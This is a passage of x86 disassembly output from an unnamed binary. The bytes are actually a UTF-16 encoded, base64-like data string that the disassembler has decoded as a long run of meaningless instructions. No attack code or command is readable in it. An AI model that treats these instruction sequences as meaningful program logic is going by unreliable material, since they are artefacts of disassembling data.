  40a8fc:	68 00 78 00 77       	push   $0x77007800
  40a901:	00 50 00             	add    %dl,0x0(%eax)
  40a904:	6c                   	insb   (%dx),%es:(%edi)
  40a905:	00 65 00             	add    %ah,0x0(%ebp)
  40a908:	62 00                	bound  %eax,(%eax)
  40a90a:	4b                   	dec    %ebx
  40a90b:	00 4a 00             	add    %cl,0x0(%edx)
  40a90e:	2f                   	das
  40a90f:	00 46 00             	add    %al,0x0(%esi)
  40a912:	70 00                	jo     0x40a914
  40a914:	79 00                	jns    0x40a916
  40a916:	54                   	push   %esp
  40a917:	00 31                	add    %dh,(%ecx)
  40a919:	00 4b 00             	add    %cl,0x0(%ebx)
  40a91c:	33 00                	xor    (%eax),%eax
  40a91e:	79 00                	jns    0x40a920
  40a920:	53                   	push   %ebx
  40a921:	00 38                	add    %bh,(%eax)
  40a923:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
  40a927:	00 49 00             	add    %cl,0x0(%ecx)
  40a92a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a92b:	00 57 00             	add    %dl,0x0(%edi)
  40a92e:	4a                   	dec    %edx
  40a92f:	00 56 00             	add    %dl,0x0(%esi)
  40a932:	38 00                	cmp    %al,(%eax)
  40a934:	63 00                	arpl   %eax,(%eax)
  40a936:	2b 00                	sub    (%eax),%eax
  40a938:	57                   	push   %edi
  40a939:	00 56 00             	add    %dl,0x0(%esi)
  40a93c:	39 00                	cmp    %eax,(%eax)
  40a93e:	53                   	push   %ebx
  40a93f:	00 51 00             	add    %dl,0x0(%ecx)
  40a942:	52                   	push   %edx
  40a943:	00 62 00             	add    %ah,0x0(%edx)
  40a946:	4a                   	dec    %edx
  40a947:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40a94b:	00 43 00             	add    %al,0x0(%ebx)
  40a94e:	78 00                	js     0x40a950
  40a950:	2f                   	das
  40a951:	00 47 00             	add    %al,0x0(%edi)
  40a954:	37                   	aaa
  40a955:	00 56 00             	add    %dl,0x0(%esi)
  40a958:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  40a95c:	7a 00                	jp     0x40a95e
  40a95e:	39 00                	cmp    %eax,(%eax)
  40a960:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40a963:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  40a967:	00 58 00             	add    %bl,0x0(%eax)
  40a96a:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  40a96e:	4a                   	dec    %edx
  40a96f:	00 56 00             	add    %dl,0x0(%esi)
  40a972:	78 00                	js     0x40a974
  40a974:	5a                   	pop    %edx
  40a975:	00 59 00             	add    %bl,0x0(%ecx)
  40a978:	64 00 4c 00 73       	add    %cl,%fs:0x73(%eax,%eax,1)
  40a97d:	00 76 00             	add    %dh,0x0(%esi)
  40a980:	6f                   	outsl  %ds:(%esi),(%dx)
  40a981:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
  40a985:	00 33                	add    %dh,(%ebx)
  40a987:	00 75 00             	add    %dh,0x0(%ebp)
  40a98a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a98b:	00 76 00             	add    %dh,0x0(%esi)
  40a98e:	2f                   	das
  40a98f:	00 52 00             	add    %dl,0x0(%edx)
  40a992:	49                   	dec    %ecx
  40a993:	00 41 00             	add    %al,0x0(%ecx)
  40a996:	36 00 39             	add    %bh,%ss:(%ecx)
  40a999:	00 68 00             	add    %ch,0x0(%eax)
  40a99c:	54                   	push   %esp
  40a99d:	00 37                	add    %dh,(%edi)
  40a99f:	00 6f 00             	add    %ch,0x0(%edi)
  40a9a2:	73 00                	jae    0x40a9a4
  40a9a4:	58                   	pop    %eax
  40a9a5:	00 67 00             	add    %ah,0x0(%edi)
  40a9a8:	78 00                	js     0x40a9aa
  40a9aa:	4a                   	dec    %edx
  40a9ab:	00 38                	add    %bh,(%eax)
  40a9ad:	00 38                	add    %bh,(%eax)
  40a9af:	00 78 00             	add    %bh,0x0(%eax)
  40a9b2:	4d                   	dec    %ebp
  40a9b3:	00 75 00             	add    %dh,0x0(%ebp)
  40a9b6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9b7:	00 43 00             	add    %al,0x0(%ebx)
  40a9ba:	30 00                	xor    %al,(%eax)
  40a9bc:	65 00 2b             	add    %ch,%gs:(%ebx)
  40a9bf:	00 4f 00             	add    %cl,0x0(%edi)
  40a9c2:	74 00                	je     0x40a9c4
  40a9c4:	2b 00                	sub    (%eax),%eax
  40a9c6:	53                   	push   %ebx
  40a9c7:	00 58 00             	add    %bl,0x0(%eax)
  40a9ca:	4e                   	dec    %esi
  40a9cb:	00 49 00             	add    %cl,0x0(%ecx)
  40a9ce:	57                   	push   %edi
  40a9cf:	00 33                	add    %dh,(%ebx)
  40a9d1:	00 53 00             	add    %dl,0x0(%ebx)
  40a9d4:	43                   	inc    %ebx
  40a9d5:	00 41 00             	add    %al,0x0(%ecx)
  40a9d8:	57                   	push   %edi
  40a9d9:	00 37                	add    %dh,(%edi)
  40a9db:	00 38                	add    %bh,(%eax)
  40a9dd:	00 6b 00             	add    %ch,0x0(%ebx)
  40a9e0:	33 00                	xor    (%eax),%eax
  40a9e2:	7a 00                	jp     0x40a9e4
  40a9e4:	4f                   	dec    %edi
  40a9e5:	00 6e 00             	add    %ch,0x0(%esi)
  40a9e8:	48                   	dec    %eax
  40a9e9:	00 6e 00             	add    %ch,0x0(%esi)
  40a9ec:	32 00                	xor    (%eax),%al
  40a9ee:	47                   	inc    %edi
  40a9ef:	00 59 00             	add    %bl,0x0(%ecx)
  40a9f2:	4b                   	dec    %ebx
  40a9f3:	00 46 00             	add    %al,0x0(%esi)
  40a9f6:	4d                   	dec    %ebp
  40a9f7:	00 73 00             	add    %dh,0x0(%ebx)
  40a9fa:	49                   	dec    %ecx
  40a9fb:	00 68 00             	add    %ch,0x0(%eax)
  40a9fe:	46                   	inc    %esi
  40a9ff:	00 6f 00             	add    %ch,0x0(%edi)
  40aa02:	75 00                	jne    0x40aa04
  40aa04:	34 00                	xor    $0x0,%al
  40aa06:	37                   	aaa
  40aa07:	00 65 00             	add    %ah,0x0(%ebp)
  40aa0a:	78 00                	js     0x40aa0c
  40aa0c:	31 00                	xor    %eax,(%eax)
  40aa0e:	37                   	aaa
  40aa0f:	00 59 00             	add    %bl,0x0(%ecx)
  40aa12:	4a                   	dec    %edx
  40aa13:	00 33                	add    %dh,(%ebx)
  40aa15:	00 79 00             	add    %bh,0x0(%ecx)
  40aa18:	75 00                	jne    0x40aa1a
  40aa1a:	30 00                	xor    %al,(%eax)
  40aa1c:	5a                   	pop    %edx
  40aa1d:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa20:	2f                   	das
  40aa21:	00 31                	add    %dh,(%ecx)
  40aa23:	00 71 00             	add    %dh,0x0(%ecx)
  40aa26:	68 00 32 00 54       	push   $0x54003200
  40aa2b:	00 32                	add    %dh,(%edx)
  40aa2d:	00 53 00             	add    %dl,0x0(%ebx)
  40aa30:	36 00 6d 00          	add    %ch,%ss:0x0(%ebp)
  40aa34:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
  40aa38:	70 00                	jo     0x40aa3a
  40aa3a:	68 00 64 00 37       	push   $0x37006400
  40aa3f:	00 4a 00             	add    %cl,0x0(%edx)
  40aa42:	2b 00                	sub    (%eax),%eax
  40aa44:	38 00                	cmp    %al,(%eax)
  40aa46:	35 00 71 00 6d       	xor    $0x6d007100,%eax
  40aa4b:	00 74 00 41          	add    %dh,0x41(%eax,%eax,1)
  40aa4f:	00 4e 00             	add    %cl,0x0(%esi)
  40aa52:	6b 00 66             	imul   $0x66,(%eax),%eax
  40aa55:	00 66 00             	add    %ah,0x0(%esi)
  40aa58:	41                   	inc    %ecx
  40aa59:	00 52 00             	add    %dl,0x0(%edx)
  40aa5c:	52                   	push   %edx
  40aa5d:	00 78 00             	add    %bh,0x0(%eax)
  40aa60:	34 00                	xor    $0x0,%al
  40aa62:	4d                   	dec    %ebp
  40aa63:	00 51 00             	add    %dl,0x0(%ecx)
  40aa66:	62 00                	bound  %eax,(%eax)
  40aa68:	62 00                	bound  %eax,(%eax)
  40aa6a:	5a                   	pop    %edx
  40aa6b:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  40aa6f:	00 32                	add    %dh,(%edx)
  40aa71:	00 33                	add    %dh,(%ebx)
  40aa73:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa76:	42                   	inc    %edx
  40aa77:	00 50 00             	add    %dl,0x0(%eax)
  40aa7a:	79 00                	jns    0x40aa7c
  40aa7c:	67 00 6f 00          	add    %ch,0x0(%bx)
  40aa80:	37                   	aaa
  40aa81:	00 4c 00 6d          	add    %cl,0x6d(%eax,%eax,1)
  40aa85:	00 6c 00 33          	add    %ch,0x33(%eax,%eax,1)
  40aa89:	00 52 00             	add    %dl,0x0(%edx)
  40aa8c:	7a 00                	jp     0x40aa8e
  40aa8e:	63 00                	arpl   %eax,(%eax)
  40aa90:	66 00 4c 00 6a       	data16 add %cl,0x6a(%eax,%eax,1)
  40aa95:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa98:	45                   	inc    %ebp
  40aa99:	00 6f 00             	add    %ch,0x0(%edi)
  40aa9c:	77 00                	ja     0x40aa9e
  40aa9e:	52                   	push   %edx
  40aa9f:	00 52 00             	add    %dl,0x0(%edx)
  40aaa2:	37                   	aaa
  40aaa3:	00 50 00             	add    %dl,0x0(%eax)
  40aaa6:	7a 00                	jp     0x40aaa8
  40aaa8:	61                   	popa
  40aaa9:	00 67 00             	add    %ah,0x0(%edi)
  40aaac:	37                   	aaa
  40aaad:	00 73 00             	add    %dh,0x0(%ebx)
  40aab0:	54                   	push   %esp
  40aab1:	00 51 00             	add    %dl,0x0(%ecx)
  40aab4:	6b 00 4c             	imul   $0x4c,(%eax),%eax
  40aab7:	00 49 00             	add    %cl,0x0(%ecx)
  40aaba:	6c                   	insb   (%dx),%es:(%edi)
  40aabb:	00 78 00             	add    %bh,0x0(%eax)
  40aabe:	6c                   	insb   (%dx),%es:(%edi)
  40aabf:	00 72 00             	add    %dh,0x0(%edx)
  40aac2:	32 00                	xor    (%eax),%al
  40aac4:	4c                   	dec    %esp
  40aac5:	00 50 00             	add    %dl,0x0(%eax)
  40aac8:	7a 00                	jp     0x40aaca
  40aaca:	62 00                	bound  %eax,(%eax)
  40aacc:	52                   	push   %edx
  40aacd:	00 2b                	add    %ch,(%ebx)
  40aacf:	00 67 00             	add    %ah,0x0(%edi)
  40aad2:	4e                   	dec    %esi
  40aad3:	00 33                	add    %dh,(%ebx)
  40aad5:	00 56 00             	add    %dl,0x0(%esi)
  40aad8:	6f                   	outsl  %ds:(%esi),(%dx)
  40aad9:	00 63 00             	add    %ah,0x0(%ebx)
  40aadc:	69 00 44 00 68 00    	imul   $0x680044,(%eax),%eax
  40aae2:	34 00                	xor    $0x0,%al
  40aae4:	45                   	inc    %ebp
  40aae5:	00 61 00             	add    %ah,0x0(%ecx)
  40aae8:	62 00                	bound  %eax,(%eax)
  40aaea:	38 00                	cmp    %al,(%eax)
  40aaec:	61                   	popa
  40aaed:	00 37                	add    %dh,(%edi)
  40aaef:	00 41 00             	add    %al,0x0(%ecx)
  40aaf2:	37                   	aaa
  40aaf3:	00 35 00 7a 00 56    	add    %dh,0x56007a00
  40aaf9:	00 68 00             	add    %ch,0x0(%eax)
  40aafc:	72 00                	jb     0x40aafe
  40aafe:	43                   	inc    %ebx
  40aaff:	00 69 00             	add    %ch,0x0(%ecx)
  40ab02:	69 00 33 00 36 00    	imul   $0x360033,(%eax),%eax
  40ab08:	72 00                	jb     0x40ab0a
  40ab0a:	33 00                	xor    (%eax),%eax
  40ab0c:	67 00 36 00 70       	add    %dh,0x7000
  40ab11:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40ab15:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  40ab19:	00 70 00             	add    %dh,0x0(%eax)
  40ab1c:	77 00                	ja     0x40ab1e
  40ab1e:	5a                   	pop    %edx
  40ab1f:	00 37                	add    %dh,(%edi)
  40ab21:	00 6e 00             	add    %ch,0x0(%esi)
  40ab24:	6c                   	insb   (%dx),%es:(%edi)
  40ab25:	00 2b                	add    %ch,(%ebx)
  40ab27:	00 4e 00             	add    %cl,0x0(%esi)
  40ab2a:	2b 00                	sub    (%eax),%eax
  40ab2c:	68 00 6a 00 74       	push   $0x74006a00
  40ab31:	00 51 00             	add    %dl,0x0(%ecx)
  40ab34:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  40ab38:	45                   	inc    %ebp
  40ab39:	00 79 00             	add    %bh,0x0(%ecx)
  40ab3c:	6a 00                	push   $0x0
  40ab3e:	7a 00                	jp     0x40ab40
  40ab40:	37                   	aaa
  40ab41:	00 57 00             	add    %dl,0x0(%edi)
  40ab44:	37                   	aaa
  40ab45:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  40ab49:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
  40ab4d:	00 38                	add    %bh,(%eax)
  40ab4f:	00 41 00             	add    %al,0x0(%ecx)
  40ab52:	56                   	push   %esi
  40ab53:	00 37                	add    %dh,(%edi)
  40ab55:	00 59 00             	add    %bl,0x0(%ecx)
  40ab58:	57                   	push   %edi
  40ab59:	00 48 00             	add    %cl,0x0(%eax)
  40ab5c:	65 00 4c 00 41       	add    %cl,%gs:0x41(%eax,%eax,1)
  40ab61:	00 4c 00 4b          	add    %cl,0x4b(%eax,%eax,1)
  40ab65:	00 72 00             	add    %dh,0x0(%edx)
  40ab68:	61                   	popa
  40ab69:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab6c:	7a 00                	jp     0x40ab6e
  40ab6e:	57                   	push   %edi
  40ab6f:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40ab73:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
  40ab77:	00 4e 00             	add    %cl,0x0(%esi)
  40ab7a:	50                   	push   %eax
  40ab7b:	00 58 00             	add    %bl,0x0(%eax)
  40ab7e:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40ab82:	6b 00 78             	imul   $0x78,(%eax),%eax
  40ab85:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ab88:	76 00                	jbe    0x40ab8a
  40ab8a:	72 00                	jb     0x40ab8c
  40ab8c:	66 00 4c 00 54       	data16 add %cl,0x54(%eax,%eax,1)
  40ab91:	00 76 00             	add    %dh,0x0(%esi)
  40ab94:	79 00                	jns    0x40ab96
  40ab96:	74 00                	je     0x40ab98
  40ab98:	48                   	dec    %eax
  40ab99:	00 4a 00             	add    %cl,0x0(%edx)
  40ab9c:	41                   	inc    %ecx
  40ab9d:	00 78 00             	add    %bh,0x0(%eax)
  40aba0:	71 00                	jno    0x40aba2
  40aba2:	45                   	inc    %ebp
  40aba3:	00 6a 00             	add    %ch,0x0(%edx)
  40aba6:	77 00                	ja     0x40aba8
  40aba8:	30 00                	xor    %al,(%eax)
  40abaa:	52                   	push   %edx
  40abab:	00 30                	add    %dh,(%eax)
  40abad:	00 62 00             	add    %ah,0x0(%edx)
  40abb0:	57                   	push   %edi
  40abb1:	00 63 00             	add    %ah,0x0(%ebx)
  40abb4:	70 00                	jo     0x40abb6
  40abb6:	64 00 33             	add    %dh,%fs:(%ebx)
  40abb9:	00 37                	add    %dh,(%edi)
  40abbb:	00 6d 00             	add    %ch,0x0(%ebp)
  40abbe:	76 00                	jbe    0x40abc0
  40abc0:	77 00                	ja     0x40abc2
  40abc2:	47                   	inc    %edi
  40abc3:	00 4e 00             	add    %cl,0x0(%esi)
  40abc6:	4e                   	dec    %esi
  40abc7:	00 5a 00             	add    %bl,0x0(%edx)
  40abca:	57                   	push   %edi
  40abcb:	00 32                	add    %dh,(%edx)
  40abcd:	00 4a 00             	add    %cl,0x0(%edx)
  40abd0:	76 00                	jbe    0x40abd2
  40abd2:	54                   	push   %esp
  40abd3:	00 74 00 62          	add    %dh,0x62(%eax,%eax,1)
  40abd7:	00 58 00             	add    %bl,0x0(%eax)
  40abda:	74 00                	je     0x40abdc
  40abdc:	75 00                	jne    0x40abde
  40abde:	6a 00                	push   $0x0
  40abe0:	47                   	inc    %edi
  40abe1:	00 6d 00             	add    %ch,0x0(%ebp)
  40abe4:	38 00                	cmp    %al,(%eax)
  40abe6:	46                   	inc    %esi
  40abe7:	00 36                	add    %dh,(%esi)
  40abe9:	00 59 00             	add    %bl,0x0(%ecx)
  40abec:	72 00                	jb     0x40abee
  40abee:	77 00                	ja     0x40abf0
  40abf0:	48                   	dec    %eax
  40abf1:	00 5a 00             	add    %bl,0x0(%edx)
  40abf4:	4d                   	dec    %ebp
  40abf5:	00 65 00             	add    %ah,0x0(%ebp)
  40abf8:	42                   	inc    %edx
  40abf9:	00 66 00             	add    %ah,0x0(%esi)
  40abfc:	2b 00                	sub    (%eax),%eax
  40abfe:	72 00                	jb     0x40ac00
  40ac00:	49                   	dec    %ecx
  40ac01:	00 68 00             	add    %ch,0x0(%eax)
  40ac04:	53                   	push   %ebx
  40ac05:	00 79 00             	add    %bh,0x0(%ecx)
  40ac08:	53                   	push   %ebx
  40ac09:	00 6e 00             	add    %ch,0x0(%esi)
  40ac0c:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac0d:	00 53 00             	add    %dl,0x0(%ebx)
  40ac10:	47                   	inc    %edi
  40ac11:	00 43 00             	add    %al,0x0(%ebx)
  40ac14:	58                   	pop    %eax
  40ac15:	00 56 00             	add    %dl,0x0(%esi)
  40ac18:	52                   	push   %edx
  40ac19:	00 4f 00             	add    %cl,0x0(%edi)
  40ac1c:	69 00 56 00 6f 00    	imul   $0x6f0056,(%eax),%eax
  40ac22:	44                   	inc    %esp
  40ac23:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  40ac27:	00 35 00 69 00 78    	add    %dh,0x78006900
  40ac2d:	00 70 00             	add    %dh,0x0(%eax)
  40ac30:	62 00                	bound  %eax,(%eax)
  40ac32:	63 00                	arpl   %eax,(%eax)
  40ac34:	4a                   	dec    %edx
  40ac35:	00 37                	add    %dh,(%edi)
  40ac37:	00 58 00             	add    %bl,0x0(%eax)
  40ac3a:	47                   	inc    %edi
  40ac3b:	00 7a 00             	add    %bh,0x0(%edx)
  40ac3e:	72 00                	jb     0x40ac40
  40ac40:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac41:	00 6e 00             	add    %ch,0x0(%esi)
  40ac44:	78 00                	js     0x40ac46
  40ac46:	64 00 78 00          	add    %bh,%fs:0x0(%eax)
  40ac4a:	50                   	push   %eax
  40ac4b:	00 59 00             	add    %bl,0x0(%ecx)
  40ac4e:	4e                   	dec    %esi
  40ac4f:	00 39                	add    %bh,(%ecx)
  40ac51:	00 57 00             	add    %dl,0x0(%edi)
  40ac54:	4a                   	dec    %edx
  40ac55:	00 58 00             	add    %bl,0x0(%eax)
  40ac58:	37                   	aaa
  40ac59:	00 41 00             	add    %al,0x0(%ecx)
  40ac5c:	6b 00 37             	imul   $0x37,(%eax),%eax
  40ac5f:	00 39                	add    %bh,(%ecx)
  40ac61:	00 47 00             	add    %al,0x0(%edi)
  40ac64:	4c                   	dec    %esp
  40ac65:	00 52 00             	add    %dl,0x0(%edx)
  40ac68:	78 00                	js     0x40ac6a
  40ac6a:	45                   	inc    %ebp
  40ac6b:	00 5a 00             	add    %bl,0x0(%edx)
  40ac6e:	71 00                	jno    0x40ac70
  40ac70:	75 00                	jne    0x40ac72
  40ac72:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40ac76:	78 00                	js     0x40ac78
  40ac78:	61                   	popa
  40ac79:	00 4f 00             	add    %cl,0x0(%edi)
  40ac7c:	78 00                	js     0x40ac7e
  40ac7e:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
  40ac82:	34 00                	xor    $0x0,%al
  40ac84:	4a                   	dec    %edx
  40ac85:	00 69 00             	add    %ch,0x0(%ecx)
  40ac88:	73 00                	jae    0x40ac8a
  40ac8a:	6a 00                	push   $0x0
  40ac8c:	68 00 4b 00 41       	push   $0x41004b00
  40ac91:	00 68 00             	add    %ch,0x0(%eax)
  40ac94:	50                   	push   %eax
  40ac95:	00 6f 00             	add    %ch,0x0(%edi)
  40ac98:	66 00 70 00          	data16 add %dh,0x0(%eax)
  40ac9c:	38 00                	cmp    %al,(%eax)
  40ac9e:	30 00                	xor    %al,(%eax)
  40aca0:	4c                   	dec    %esp
  40aca1:	00 39                	add    %bh,(%ecx)
  40aca3:	00 43 00             	add    %al,0x0(%ebx)
  40aca6:	2b 00                	sub    (%eax),%eax
  40aca8:	6d                   	insl   (%dx),%es:(%edi)
  40aca9:	00 62 00             	add    %ah,0x0(%edx)
  40acac:	5a                   	pop    %edx
  40acad:	00 70 00             	add    %dh,0x0(%eax)
  40acb0:	6e                   	outsb  %ds:(%esi),(%dx)
  40acb1:	00 6b 00             	add    %ch,0x0(%ebx)
  40acb4:	33 00                	xor    (%eax),%eax
  40acb6:	4e                   	dec    %esi
  40acb7:	00 4d 00             	add    %cl,0x0(%ebp)
  40acba:	32 00                	xor    (%eax),%al
  40acbc:	71 00                	jno    0x40acbe
  40acbe:	5a                   	pop    %edx
  40acbf:	00 45 00             	add    %al,0x0(%ebp)
  40acc2:	52                   	push   %edx
  40acc3:	00 42 00             	add    %al,0x0(%edx)
  40acc6:	4a                   	dec    %edx
  40acc7:	00 42 00             	add    %al,0x0(%edx)
  40acca:	76 00                	jbe    0x40accc
  40accc:	53                   	push   %ebx
  40accd:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  40acd1:	00 6f 00             	add    %ch,0x0(%edi)
  40acd4:	37                   	aaa
  40acd5:	00 6a 00             	add    %ch,0x0(%edx)
  40acd8:	55                   	push   %ebp
  40acd9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40acdc:	47                   	inc    %edi
  40acdd:	00 37                	add    %dh,(%edi)
  40acdf:	00 4e 00             	add    %cl,0x0(%esi)
  40ace2:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40ace6:	4d                   	dec    %ebp
  40ace7:	00 49 00             	add    %cl,0x0(%ecx)
  40acea:	75 00                	jne    0x40acec
  40acec:	75 00                	jne    0x40acee
  40acee:	4b                   	dec    %ebx
  40acef:	00 4a 00             	add    %cl,0x0(%edx)
  40acf2:	55                   	push   %ebp
  40acf3:	00 30                	add    %dh,(%eax)
  40acf5:	00 59 00             	add    %bl,0x0(%ecx)
  40acf8:	30 00                	xor    %al,(%eax)
  40acfa:	35 00 6c 00 2f       	xor    $0x2f006c00,%eax
  40acff:	00 50 00             	add    %dl,0x0(%eax)
  40ad02:	76 00                	jbe    0x40ad04
  40ad04:	69 00 6d 00 78 00    	imul   $0x78006d,(%eax),%eax
  40ad0a:	4f                   	dec    %edi
  40ad0b:	00 48 00             	add    %cl,0x0(%eax)
  40ad0e:	43                   	inc    %ebx
  40ad0f:	00 59 00             	add    %bl,0x0(%ecx)
  40ad12:	30 00                	xor    %al,(%eax)
  40ad14:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad15:	00 42 00             	add    %al,0x0(%edx)
  40ad18:	69 00 59 00 4d 00    	imul   $0x4d0059,(%eax),%eax
  40ad1e:	42                   	inc    %edx
  40ad1f:	00 63 00             	add    %ah,0x0(%ebx)
  40ad22:	53                   	push   %ebx
  40ad23:	00 38                	add    %bh,(%eax)
  40ad25:	00 36                	add    %dh,(%esi)
  40ad27:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40ad2b:	00 47 00             	add    %al,0x0(%edi)
  40ad2e:	2b 00                	sub    (%eax),%eax
  40ad30:	52                   	push   %edx
  40ad31:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  40ad35:	00 38                	add    %bh,(%eax)
  40ad37:	00 68 00             	add    %ch,0x0(%eax)
  40ad3a:	2b 00                	sub    (%eax),%eax
  40ad3c:	67 00 4d 00          	add    %cl,0x0(%di)
  40ad40:	4a                   	dec    %edx
  40ad41:	00 4e 00             	add    %cl,0x0(%esi)
  40ad44:	41                   	inc    %ecx
  40ad45:	00 66 00             	add    %ah,0x0(%esi)
  40ad48:	38 00                	cmp    %al,(%eax)
  40ad4a:	4d                   	dec    %ebp
  40ad4b:	00 67 00             	add    %ah,0x0(%edi)
  40ad4e:	6c                   	insb   (%dx),%es:(%edi)
  40ad4f:	00 37                	add    %dh,(%edi)
  40ad51:	00 78 00             	add    %bh,0x0(%eax)
  40ad54:	62 00                	bound  %eax,(%eax)
  40ad56:	4b                   	dec    %ebx
  40ad57:	00 42 00             	add    %al,0x0(%edx)
  40ad5a:	76 00                	jbe    0x40ad5c
  40ad5c:	30 00                	xor    %al,(%eax)
  40ad5e:	46                   	inc    %esi
  40ad5f:	00 37                	add    %dh,(%edi)
  40ad61:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  40ad65:	00 32                	add    %dh,(%edx)
  40ad67:	00 63 00             	add    %ah,0x0(%ebx)
  40ad6a:	4d                   	dec    %ebp
  40ad6b:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad6e:	35 00 39 00 50       	xor    $0x50003900,%eax
  40ad73:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad76:	5a                   	pop    %edx
  40ad77:	00 4b 00             	add    %cl,0x0(%ebx)
  40ad7a:	59                   	pop    %ecx
  40ad7b:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  40ad7f:	00 67 00             	add    %ah,0x0(%edi)
  40ad82:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40ad86:	30 00                	xor    %al,(%eax)
  40ad88:	72 00                	jb     0x40ad8a
  40ad8a:	75 00                	jne    0x40ad8c
  40ad8c:	6a 00                	push   $0x0
  40ad8e:	35 00 4c 00 6d       	xor    $0x6d004c00,%eax
  40ad93:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40ad97:	00 6f 00             	add    %ch,0x0(%edi)
  40ad9a:	4c                   	dec    %esp
  40ad9b:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40ad9f:	00 70 00             	add    %dh,0x0(%eax)
  40ada2:	46                   	inc    %esi
  40ada3:	00 4a 00             	add    %cl,0x0(%edx)
  40ada6:	6b 00 37             	imul   $0x37,(%eax),%eax
  40ada9:	00 36                	add    %dh,(%esi)
  40adab:	00 66 00             	add    %ah,0x0(%esi)
  40adae:	6a 00                	push   $0x0
  40adb0:	31 00                	xor    %eax,(%eax)
  40adb2:	72 00                	jb     0x40adb4
  40adb4:	68 00 48 00 62       	push   $0x62004800
  40adb9:	00 2f                	add    %ch,(%edi)
  40adbb:	00 41 00             	add    %al,0x0(%ecx)
  40adbe:	56                   	push   %esi
  40adbf:	00 2f                	add    %ch,(%edi)
  40adc1:	00 53 00             	add    %dl,0x0(%ebx)
  40adc4:	69 00 45 00 4c 00    	imul   $0x4c0045,(%eax),%eax
  40adca:	6f                   	outsl  %ds:(%esi),(%dx)
  40adcb:	00 66 00             	add    %ah,0x0(%esi)
  40adce:	6c                   	insb   (%dx),%es:(%edi)
  40adcf:	00 46 00             	add    %al,0x0(%esi)
  40add2:	6b 00 70             	imul   $0x70,(%eax),%eax
  40add5:	00 49 00             	add    %cl,0x0(%ecx)
  40add8:	4c                   	dec    %esp
  40add9:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  40addd:	00 5a 00             	add    %bl,0x0(%edx)
  40ade0:	37                   	aaa
  40ade1:	00 32                	add    %dh,(%edx)
  40ade3:	00 46 00             	add    %al,0x0(%esi)
  40ade6:	4b                   	dec    %ebx
  40ade7:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  40adeb:	00 56 00             	add    %dl,0x0(%esi)
  40adee:	62 00                	bound  %eax,(%eax)
  40adf0:	47                   	inc    %edi
  40adf1:	00 53 00             	add    %dl,0x0(%ebx)
  40adf4:	58                   	pop    %eax
  40adf5:	00 35 00 51 00 30    	add    %dh,0x30005100
  40adfb:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  40adff:	00 58 00             	add    %bl,0x0(%eax)
  40ae02:	73 00                	jae    0x40ae04
  40ae04:	52                   	push   %edx
  40ae05:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae08:	74 00                	je     0x40ae0a
  40ae0a:	55                   	push   %ebp
  40ae0b:	00 4a 00             	add    %cl,0x0(%edx)
  40ae0e:	63 00                	arpl   %eax,(%eax)
  40ae10:	56                   	push   %esi
  40ae11:	00 69 00             	add    %ch,0x0(%ecx)
  40ae14:	4c                   	dec    %esp
  40ae15:	00 43 00             	add    %al,0x0(%ebx)
  40ae18:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40ae1c:	47                   	inc    %edi
  40ae1d:	00 32                	add    %dh,(%edx)
  40ae1f:	00 5a 00             	add    %bl,0x0(%edx)
  40ae22:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40ae26:	34 00                	xor    $0x0,%al
  40ae28:	73 00                	jae    0x40ae2a
  40ae2a:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  40ae2e:	57                   	push   %edi
  40ae2f:	00 38                	add    %bh,(%eax)
  40ae31:	00 79 00             	add    %bh,0x0(%ecx)
  40ae34:	61                   	popa
  40ae35:	00 46 00             	add    %al,0x0(%esi)
  40ae38:	4a                   	dec    %edx
  40ae39:	00 61 00             	add    %ah,0x0(%ecx)
  40ae3c:	33 00                	xor    (%eax),%eax
  40ae3e:	46                   	inc    %esi
  40ae3f:	00 41 00             	add    %al,0x0(%ecx)
  40ae42:	2f                   	das
  40ae43:	00 51 00             	add    %dl,0x0(%ecx)
  40ae46:	2b 00                	sub    (%eax),%eax
